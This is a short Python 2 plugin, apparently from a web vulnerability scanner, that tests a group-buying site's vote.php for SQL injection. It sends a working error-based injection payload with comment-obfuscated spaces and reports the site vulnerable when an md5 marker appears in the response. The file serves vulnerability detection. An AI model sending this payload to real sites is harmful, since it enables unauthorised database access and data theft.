#!/usr/bin/python
# -*- coding: utf-8 -*-
from lib.common import *
def run_domain(http,ob):
    try:  
        result=[]                               
        detail=u''
        detail=detail.encode('utf8')
        domain=ob['domain']
        url="vote.php?act=dovote&name[1/**/and/**/(select/**/1/**/from(select/**/count(*),concat(0x7c,(select/**/(Select/**/md5(888888888881))/**/from/**/information_schema.tables/**/limit/**/0,1),0x7c,floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x/**/limit/**/0,1)a)%23][111]=aa"
        geturl="%s://%s%s%s"%(ob['scheme'],domain,ob['base_path'],url)
        
        response,content=requestUrl(http,geturl,ob['task_id'],ob['domain_id'])
        if content.find("a0ae29ba9a65787b63642716a5d66f70")>=0:
            request = getRequest(geturl)
            response = getResponse(response)
            result.append(getRecord(ob,ob['scheme']+"://"+domain,ob['level'],detail,request,response))
    except Exception, e:
        logging.getLogger().error("File:TXtuangousqlinjectionscript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:TXtuangousqlinjectionscript.py, run_domain function :" + str(e))
    return result

